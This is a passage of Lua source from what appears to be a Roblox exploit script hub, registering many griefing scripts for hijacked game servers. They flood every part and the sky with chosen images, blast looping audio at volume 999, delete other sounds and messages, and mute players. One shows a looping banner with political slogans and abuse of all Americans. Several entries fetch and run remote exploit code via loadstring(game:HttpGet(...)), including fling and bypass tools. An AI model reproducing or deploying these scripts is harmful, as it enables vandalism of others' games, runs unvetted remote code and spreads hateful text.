            if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
                existing = true
                break
            end
        end
        
        if not existing then
            local pe = Instance.new("ParticleEmitter")
            pe.Texture = imageId
            pe.VelocitySpread = velocitySpread
            pe.Parent = torso
        end
    end
end

task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                applyParticles(player.Character)
            end
        end
        t(2)
    end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 0, 0),
		FogEnd = 150,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}
	
	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			t(1)
		end
	end)
end)

local function applyParticlesToPart(part)
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
            child:Destroy()
        end
    end

    local alreadyHas = false
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture == imageId then
            alreadyHas = true
            break
        end
    end

    if not alreadyHas then
        local pe = Instance.new("ParticleEmitter")
        pe.Texture = imageId
        pe.VelocitySpread = 360
        pe.Rate = 10
        pe.Lifetime = NumberRange.new(5)
        pe.Speed = NumberRange.new(10)
        pe.Parent = part
        pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
    end
end

task.spawn(function()
    while true do
        local parts = {}
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                table.insert(parts, part)
            end
        end

        for i = 1, #parts, batchSize do
            for j = i, math.min(i + batchSize - 1, #parts) do
                applyParticlesToPart(parts[j])
            end
            
            t(1)
        end

        t(1)
    end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound4")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound4"
			sound.SoundId = musicId
			sound.Looped = true
			sound.TimePosition = 18.2
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		t(2)
	end
end)

local function write(text, object)
	if object:IsA("Hint") then
		local count = object:FindFirstChild("Count")
		if not count then
			count = Instance.new("NumberValue")
			count.Name = "Count"
			count.Parent = object
		end
		count.Value += 1
		local startCount = count.Value

		for i = 1, #text do
			if count.Value == startCount then
				object.Text = string.sub(text, 1, i)
				t(0.06)
			else
				break
			end
		end
	end
end

task.spawn(function()
	local bro = Instance.new("Hint")
	bro.Name = "canttouchthishint4"
	bro.Parent = workspace

	spawn(function()
		while true do
			local existing = workspace:FindFirstChild("canttouchthishint4")
			if not existing then
				local bro = Instance.new("Hint")
				bro.Name = "canttouchthishint4"
				bro.Parent = workspace
				write("习近平万岁!!! GLORY TO THE CCP!!! 🇨🇳🇨🇳 上帝保佑你金山银山!!! 🇨🇳 向我们的光荣领袖习近平致敬!!! 操唐纳德 特朗普，操所有美国人!!! 🇨🇳🇨🇳🇨🇳", bro)
			end
			t(1)
		end
	end)

	write("习近平万岁!!! GLORY TO THE CCP!!! 🇨🇳🇨🇳 上帝保佑你金山银山!!! 🇨🇳 向我们的光荣领袖习近平致敬!!! 操唐纳德 特朗普，操所有美国人!!! 🇨🇳🇨🇳🇨🇳", bro)
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint4" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint4" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound4" then
				sound:Destroy()
			end
		end
		t(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		t(2)
	end
end)
]], "CS / SS")

cscript("dreamybull", [[
local batchSize = 1000000
local imageId = "rbxassetid://13853621129"
local musicId = "rbxassetid://94356638905764"

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = imageId
		sky.SkyboxDn = imageId
		sky.SkyboxFt = imageId
		sky.SkyboxLf = imageId
		sky.SkyboxRt = imageId
		sky.SkyboxUp = imageId
		sky.Parent = Lighting

		t(2)
	end
end)

local function applyParticles(character)
	local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
	if not torso then return end

	for _, particle in ipairs(torso:GetChildren()) do
		if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
			particle:Destroy()
		end
	end

	for _, velocitySpread in ipairs({0, 0, 0}) do
		local existing = false

		for _, particle in ipairs(torso:GetChildren()) do
			if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
				existing = true
				break
			end
		end

		if not existing then
			local pe = Instance.new("ParticleEmitter")
			pe.Texture = imageId
			pe.VelocitySpread = velocitySpread
			pe.Parent = torso
		end
	end
end

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			if player.Character then
				applyParticles(player.Character)
			end
		end
		t(2)
	end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}

	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			t(1)
		end
	end)
end)

local function applyParticlesToPart(part)
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
			child:Destroy()
		end
	end

	local alreadyHas = false
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("ParticleEmitter") and child.Texture == imageId then
			alreadyHas = true
			break
		end
	end

	if not alreadyHas then
		local pe = Instance.new("ParticleEmitter")
		pe.Texture = imageId
		pe.VelocitySpread = 360
		pe.Rate = 10
		pe.Lifetime = NumberRange.new(5)
		pe.Speed = NumberRange.new(10)
		pe.Parent = part
		pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
	end
end

task.spawn(function()
	while true do
		local parts = {}
		for _, part in ipairs(workspace:GetDescendants()) do
			if part:IsA("BasePart") then
				table.insert(parts, part)
			end
		end

		for i = 1, #parts, batchSize do
			for j = i, math.min(i + batchSize - 1, #parts) do
				applyParticlesToPart(parts[j])
			end

			t(1)
		end

		t(1)
	end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound5")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound5"
			sound.SoundId = musicId
			sound.Looped = true
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		t(2)
	end
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound5" then
				sound:Destroy()
			end
		end
		t(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		t(2)
	end
end)

local function clearDecals(part)
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("Decal") then
			child:Destroy()
		end
	end
end

local function applyDecals(part)
	for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
		local decal = Instance.new("Decal")
		decal.Texture = imageId
		decal.Face = face
		decal.Parent = part
	end
end

task.spawn(function()
	while true do
		local allParts = {}
		for _, part in ipairs(Workspace:GetDescendants()) do
			if part:IsA("BasePart") then
				table.insert(allParts, part)
			end
		end

		local index = 1
		while index <= #allParts do
			for i = index, math.min(index + 99, #allParts) do
				local part = allParts[i]
				part.Material = Enum.Material.Plastic
				clearDecals(part)
				applyDecals(part)
			end
			index += 100
			t(1)
		end
	end
end)
]], "CS / SS")

cscript("ghosthub", [[
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-GhostHub-Universal-Games-25151"))()
]], "LS")

cscript("ds tester 1", [[
	function test2(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://131178173049173" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://131178173049173"
				Two.Texture = "rbxassetid://131178173049173"
				Three.Texture = "rbxassetid://131178173049173"
				Four.Texture = "rbxassetid://131178173049173"
				Five.Texture = "rbxassetid://131178173049173"
				Six.Texture = "rbxassetid://131178173049173"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			test2(v)
		end
	end
	function test3(root)
		for _, v in pairs(root:GetChildren()) do
			test3(v)
		end
	end
	test2(game.Workspace)
	test3(game.Workspace)

	lighting = game:GetService"Lighting"

local oldSky = lighting:FindFirstChildOfClass("Sky")
if oldSky then
    oldSky:Destroy()
    t()
end

local sky = Instance.new("Sky")
sky.SkyboxBk = "rbxassetid://131178173049173"
sky.SkyboxDn = "rbxassetid://131178173049173"
sky.SkyboxFt = "rbxassetid://131178173049173"
sky.SkyboxLf = "rbxassetid://131178173049173"
sky.SkyboxRt = "rbxassetid://131178173049173"
sky.SkyboxUp = "rbxassetid://131178173049173"

sky.Parent = lighting
]], "CS / SS")

cscript("ds tester 2", [[
	function test2(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://89442759973598" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://89442759973598"
				Two.Texture = "rbxassetid://89442759973598"
				Three.Texture = "rbxassetid://89442759973598"
				Four.Texture = "rbxassetid://89442759973598"
				Five.Texture = "rbxassetid://89442759973598"
				Six.Texture = "rbxassetid://89442759973598"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			test2(v)
		end
	end
	function test3(root)
		for _, v in pairs(root:GetChildren()) do
			test3(v)
		end
	end
	test2(game.Workspace)
	test3(game.Workspace)

	lighting = game:GetService"Lighting"

local oldSky = lighting:FindFirstChildOfClass("Sky")
if oldSky then
    oldSky:Destroy()
    t()
end

local sky = Instance.new("Sky")
sky.SkyboxBk = "rbxassetid://89442759973598"
sky.SkyboxDn = "rbxassetid://89442759973598"
sky.SkyboxFt = "rbxassetid://89442759973598"
sky.SkyboxLf = "rbxassetid://89442759973598"
sky.SkyboxRt = "rbxassetid://89442759973598"
sky.SkyboxUp = "rbxassetid://89442759973598"

sky.Parent = lighting
]], "CS / SS")

cscript("ds tester 3", [[
	function test2(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://82751535106374" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://82751535106374"
				Two.Texture = "rbxassetid://82751535106374"
				Three.Texture = "rbxassetid://82751535106374"
				Four.Texture = "rbxassetid://82751535106374"
				Five.Texture = "rbxassetid://82751535106374"
				Six.Texture = "rbxassetid://82751535106374"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			test2(v)
		end
	end
	function test3(root)
		for _, v in pairs(root:GetChildren()) do
			test3(v)
		end
	end
	test2(game.Workspace)
	test3(game.Workspace)

	lighting = game:GetService"Lighting"

local oldSky = lighting:FindFirstChildOfClass("Sky")
if oldSky then
    oldSky:Destroy()
    t()
end

local sky = Instance.new("Sky")
sky.SkyboxBk = "rbxassetid://82751535106374"
sky.SkyboxDn = "rbxassetid://82751535106374"
sky.SkyboxFt = "rbxassetid://82751535106374"
sky.SkyboxLf = "rbxassetid://82751535106374"
sky.SkyboxRt = "rbxassetid://82751535106374"
sky.SkyboxUp = "rbxassetid://82751535106374"

sky.Parent = lighting
]], "CS / SS")

cscript("manon billboards", [[
local imgs = {
	"http://www.roblox.com/asset/?id=101237382805423",
	"http://www.roblox.com/asset/?id=89208523637949",
	"http://www.roblox.com/asset/?id=71661000559292",
	"http://www.roblox.com/asset/?id=90561155276969",
	"http://www.roblox.com/asset/?id=94754770398224",
	"http://www.roblox.com/asset/?id=139866687601719",
	"http://www.roblox.com/asset/?id=73504679034131",
	"http://www.roblox.com/asset/?id=125003859591663",
	"http://www.roblox.com/asset/?id=133067734889959",
	"http://www.roblox.com/asset/?id=93193616917547",
	"http://www.roblox.com/asset/?id=121611382430450",
	"http://www.roblox.com/asset/?id=89967226392530",
	"http://www.roblox.com/asset/?id=126583685682788",
	"http://www.roblox.com/asset/?id=94213248040489"
}

local BILLBOARD_NAME = "AnimatedBillboard"

function makebill(part)
	if part:FindFirstChild(BILLBOARD_NAME) then return end

	local bill = Instance.new("BillboardGui")
	bill.Name = BILLBOARD_NAME
	bill.Size = UDim2.new(3, 0, 3, 0)
	bill.AlwaysOnTop = true
	bill.Adornee = part
	bill.Parent = part

	local imageLabels = {}

	for i, imgUrl in ipairs(imgs) do
		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Size = UDim2.new(1, 0, 1, 0)
		imageLabel.BackgroundTransparency = 1
		imageLabel.Image = imgUrl
		imageLabel.Visible = false
		imageLabel.Parent = bill
		table.insert(imageLabels, imageLabel)
	end

	task.spawn(function()
		local index = 1
		while bill and bill.Parent do
			for i, label in ipairs(imageLabels) do
				label.Visible = (i == index)
			end
			index = (index % #imageLabels) + 1
			t(0.1)
		end
	end)
end

function isPlayerHead(part)
	return part:IsA("Part") and part.Name == "Head"
		and part.Parent and part.Parent:FindFirstChildOfClass("Humanoid")
end

function addbill()
	for _, descendant in pairs(workspace:GetDescendants()) do
		if isPlayerHead(descendant) then
			makebill(descendant)
		end
	end

	workspace.DescendantAdded:Connect(function(newDescendant)
		if isPlayerHead(newDescendant) then
			makebill(newDescendant)
		end
	end)
end

addbill()
]], "CS / SS")

cscript("manon sky", [[
local imageOne   = "http://www.roblox.com/asset/?id=101237382805423"
local imageTwo   = "http://www.roblox.com/asset/?id=89208523637949"
local imageThree = "http://www.roblox.com/asset/?id=71661000559292"
local imageFour  = "http://www.roblox.com/asset/?id=90561155276969"
local imageFive  = "http://www.roblox.com/asset/?id=94754770398224"
local imageSix   = "http://www.roblox.com/asset/?id=139866687601719"
local imageSeven = "http://www.roblox.com/asset/?id=73504679034131"
local imageEight = "http://www.roblox.com/asset/?id=125003859591663"
local imageNine   = "http://www.roblox.com/asset/?id=133067734889959"
local imageTen = "http://www.roblox.com/asset/?id=93193616917547"
local imageEleven = "http://www.roblox.com/asset/?id=121611382430450"
local imageTwelve   = "http://www.roblox.com/asset/?id=89967226392530"
local imageThirteen = "http://www.roblox.com/asset/?id=126583685682788"
local imageFourteen = "http://www.roblox.com/asset/?id=94213248040489"

local Sky = Instance.new("Sky", game.Lighting)

local function setSkybox(image)
	Sky.SkyboxBk = image
	Sky.SkyboxDn = image
	Sky.SkyboxFt = image
	Sky.SkyboxLf = image
	Sky.SkyboxRt = image
	Sky.SkyboxUp = image
end

local images = {
	imageOne,
	imageTwo,
	imageThree,
	imageFour,
	imageFive,
	imageSix,
	imageSeven,
	imageEight,
	imageNine,
	imageTen,
	imageEleven,
	imageTwelve,
	imageThirteen,
	imageFourteen
}

spawn(function()
	while true do
		for _, image in ipairs(images) do
			setSkybox(image)
			t(0.1)
		end
	end
end)
]], "CS / SS")

cscript("hide workspace but players", [[
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local function char(instance)
	for _, player in pairs(Players:GetPlayers()) do
		local char = player.Character
		if char and (instance == char or instance:IsDescendantOf(char)) then
			return true
		end
	end
	return false
end

function hide()
	for _, obj in ipairs(workspace:GetDescendants()) do
		if not char(obj) then
			if obj:IsA("BasePart") then
				obj.Transparency = 1
			elseif obj:IsA("Decal") or obj:IsA("SurfaceGui") or obj:IsA("BillboardGui") then
				obj.Transparency = 1
			elseif obj:IsA("Highlight") then
				obj.Transparency = 1
			end
		end
	end
end

t()
hide()
]], "CS / SS")

cscript("roblox icons message", [[
local function createScrollingText(text, originalObject)
	if not originalObject:IsA("Message") then return end

	local targetParent = originalObject.Parent
	local targetName = originalObject.Name

	local function createNewMessage()
		local newMessage = Instance.new("Message")
		newMessage.Name = targetName
		newMessage.Parent = targetParent

		local scrollControl = Instance.new("BoolValue")
		scrollControl.Name = "ScrollControl"
		scrollControl.Value = true
		scrollControl.Parent = newMessage

		local lines = {}
		for line in text:gmatch("([^\n]+)") do
			table.insert(lines, "" .. line .. "")
		end

		coroutine.wrap(function()
			local positions = {}
			for i = 1, #lines do
				positions[i] = 1
			end

			while scrollControl.Parent == newMessage and scrollControl.Value do
				local displayText = ""

				for i, line in ipairs(lines) do
					local lineLength = #line
					local pos = positions[i]

					local displayLine = line:sub(pos, pos + lineLength - 4)

					if #displayLine < lineLength - 3 then
						displayLine = displayLine .. line:sub(1, lineLength - 3 - #displayLine)
					end

					positions[i] = pos + 1
					if positions[i] > lineLength then
						positions[i] = 1
					end

					displayText = displayText .. displayLine
					if i < #lines then
						displayText = displayText .. "\n"
					end
				end

				newMessage.Text = displayText
				t(0.15)
			end

			if scrollControl.Parent == newMessage then
				scrollControl:Destroy()
			end
		end)()

		return newMessage
	end

	local currentMessage = createNewMessage()

	coroutine.wrap(function()
		while true do
			t(1)

			if not currentMessage or not currentMessage.Parent then
				currentMessage = createNewMessage()
			end

			for _, sound in pairs(game:GetDescendants()) do
				if sound:IsA("Sound") and sound.Name ~= "dontdeleteme" and sound.Name ~= "canttouchthis" then
					sound:Destroy()
				end
			end

			for _, message in pairs(game:GetDescendants()) do
				if message:IsA("Sound") and message.Name ~= "yuhh" then
					message:Destroy()
				end
			end

			for _, hint in pairs(game:GetDescendants()) do
				if hint:IsA("Sound") then
					hint:Destroy()
				end
			end

			local Lighting = game:GetService("Lighting")
			local Camera = game:GetService("Workspace").CurrentCamera

			local defaultValues = {
				Brightness = 2,
				Ambient = Color3.new(0.5, 0.5, 0.5),
				ColorShift_Bottom = Color3.new(0, 0, 0),
				ColorShift_Top = Color3.new(0, 0, 0),
				OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
				ClockTime = 14,
				FogColor = Color3.new(1, 1, 1),
				FogEnd = 10000000000,
				FogStart = 0,
				GeographicLatitude = 41.733,
				GlobalShadows = true,
				ExposureCompensation = 0,
				EnvironmentDiffuseScale = 1,
				EnvironmentSpecularScale = 1,
				ShadowSoftness = 0.2,
				Technology = Enum.Technology.Compatibility,
			}

			local function restoreLightingEffects()
				for _, effect in ipairs(Lighting:GetChildren()) do
					if effect:IsA("PostEffect") or effect:IsA("BloomEffect") or effect:IsA("ColorCorrectionEffect") or 
						effect:IsA("SunRaysEffect") or effect:IsA("DepthOfFieldEffect") or effect:IsA("MotionBlurEffect") then
						effect:Destroy()
					end
				end
			end

			local function restoreCameraEffects()
				Camera.FieldOfView = 70
				Camera.CameraSubject = nil
				Camera.CameraType = Enum.CameraType.Custom
				for _, obj in ipairs(Camera:GetChildren()) do
					if obj:IsA("Script") or obj:IsA("LocalScript") then
						obj:Destroy()
					end
				end
			end

			task.spawn(function()
				for property, value in pairs(defaultValues) do
					pcall(function()
						Lighting[property] = value
					end)
				end

				restoreLightingEffects()
				restoreCameraEffects()
			end)
		end
	end)()

	return currentMessage
end

local bro = Instance.new("Message", workspace)
bro.Name = "yuhh"

local function grs(l)
	local chars = {"", "", ""}
	local result = ""
	for i = 1, l do
		local rndi = math.random(1, #chars)
		result = result .. chars[rndi]
	end
	return result
end

local messageText = table.concat({
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
}, "\n")

createScrollingText(messageText, bro)
]], "CS / SS")

cscript("questionable billboards", [[
local imgs = {
	"http://www.roblox.com/asset/?id=121611601219308",
	"http://www.roblox.com/asset/?id=96924098486679",
	"http://www.roblox.com/asset/?id=103477226772653",
	"http://www.roblox.com/asset/?id=130687509173596",
	"http://www.roblox.com/asset/?id=102426484545843",
	
	"http://www.roblox.com/asset/?id=102426484545843",
	"http://www.roblox.com/asset/?id=130687509173596",
	"http://www.roblox.com/asset/?id=103477226772653",
	"http://www.roblox.com/asset/?id=96924098486679",
	"http://www.roblox.com/asset/?id=121611601219308",
	"http://www.roblox.com/asset/?id=121611601219308",
}

local BILLBOARD_NAME = "AnimatedBillboard"

function makebill(part)
	if part:FindFirstChild(BILLBOARD_NAME) then return end

	local bill = Instance.new("BillboardGui")
	bill.Name = BILLBOARD_NAME
	bill.Size = UDim2.new(3, 0, 3, 0)
	bill.AlwaysOnTop = true
	bill.Adornee = part
	bill.Parent = part

	local imageLabels = {}

	for i, imgUrl in ipairs(imgs) do
		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Size = UDim2.new(1, 0, 1, 0)
		imageLabel.BackgroundTransparency = 1
		imageLabel.Image = imgUrl
		imageLabel.Visible = false
		imageLabel.Parent = bill
		table.insert(imageLabels, imageLabel)
	end

	task.spawn(function()
		local index = 1
		while bill and bill.Parent do
			for i, label in ipairs(imageLabels) do
				label.Visible = (i == index)
			end
			index = (index % #imageLabels) + 1
			t(0.1)
		end
	end)
end

function isPlayerHead(part)
	return part:IsA("Part") and part.Name == "Head"
		and part.Parent and part.Parent:FindFirstChildOfClass("Humanoid")
end

function addbill()
	for _, descendant in pairs(workspace:GetDescendants()) do
		if isPlayerHead(descendant) then
			makebill(descendant)
		end
	end

	workspace.DescendantAdded:Connect(function(newDescendant)
		if isPlayerHead(newDescendant) then
			makebill(newDescendant)
		end
	end)
end

addbill()
]], "CS / SS")

cscript("gear giver", [[ 
loadstring(game:HttpGet("https://raw.githubusercontent.com/x2-x21-x18-x14-x5-x18/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/gear%20giver.lua"))()
]], "LS")

cscript("anti part fling", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Bmiscellaneous%5D/music%23%5Banti%20part%20fling%5D.lua"))()
]], "CS / SS")

cscript("betterbypasser", [[ 
loadstring(game:HttpGet("https://github.com/Synergy-Networks/products/raw/main/BetterBypasser/loader.lua"))()
]], "LS")

cscript("black hole", [[ 
loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/BringFlingPlayers"))("More Scripts: t.me/arceusxscripts")
]], "LS")

cscript("anti fall damage", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxten-Keyes/music/refs/heads/main/music%23%5Bscripts%5D/music%23%5Bmiscellaneous%5D/music%23%5Banti%20fall%20damage%5D.lua"))()
]], "CS / SS")

cscript("nullfire", [[ 
loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Null-Fire/main/Loader"))()
]], "LS")

cscript("r6 crawl tool", [[
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "crawler"
local WALK_ANIMATION_ID = "rbxassetid://282574440"
local WALK_SPEED_THRESHOLD = 1

local function createCustomTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false

	tool.Parent = LocalPlayer:WaitForChild("Backpack")
end

createCustomTool()

local walkAnim = Instance.new("Animation")
walkAnim.AnimationId = WALK_ANIMATION_ID

local currentTrack = nil
local animator = nil
local equipped = false
local humanoid = nil

local function stopTrack()
	if currentTrack then
		currentTrack:Stop()
		currentTrack = nil
	end
end

local function startTrack()
	if animator and not currentTrack then
		currentTrack = animator:LoadAnimation(walkAnim)
		currentTrack.Priority = Enum.AnimationPriority.Movement
		currentTrack.Looped = true
		currentTrack:Play()
	end
end

local function setupTool(tool)
	if tool:IsA("Tool") and tool.Name == TOOL_NAME then
		tool.Equipped:Connect(function()
			equipped = true
		end)
		tool.Unequipped:Connect(function()
			equipped = false
			stopTrack()
		end)
	end
end

local function onCharacterAdded(char)
	humanoid = char:WaitForChild("Humanoid")
	local hrp = char:WaitForChild("HumanoidRootPart")

	animator = humanoid:FindFirstChildWhichIsA("Animator")
	if not animator then
		animator = Instance.new("Animator")
		animator.Parent = humanoid
	end

	for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
		setupTool(tool)
	end
	for _, item in ipairs(char:GetChildren()) do
		if item:IsA("Tool") then
			setupTool(item)
		end
	end

	LocalPlayer.Backpack.ChildAdded:Connect(setupTool)
	char.ChildAdded:Connect(setupTool)

	RunService.Heartbeat:Connect(function()
		if not equipped or not humanoid or not hrp then
			stopTrack()
			return
		end

		local velocity = hrp.Velocity
		local speed = Vector3.new(velocity.X, 0, velocity.Z).Magnitude

		if speed > WALK_SPEED_THRESHOLD then
			startTrack()
		else
			stopTrack()
		end
	end)
end

if LocalPlayer.Character then
	onCharacterAdded(LocalPlayer.Character)
end

LocalPlayer.CharacterAdded:Connect(function() t(0.5) onCharacterAdded(LocalPlayer.Character) end)
]], "CS / SS")

cscript("r6 jerk off tool", [[
task.spawn(function()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "jerk off"
local ANIMATION_ID = "rbxassetid://72042024"
local ANIMATION_ID2 = "rbxassetid://168268306"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local animTrack2 = nil
	local loopConnection = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
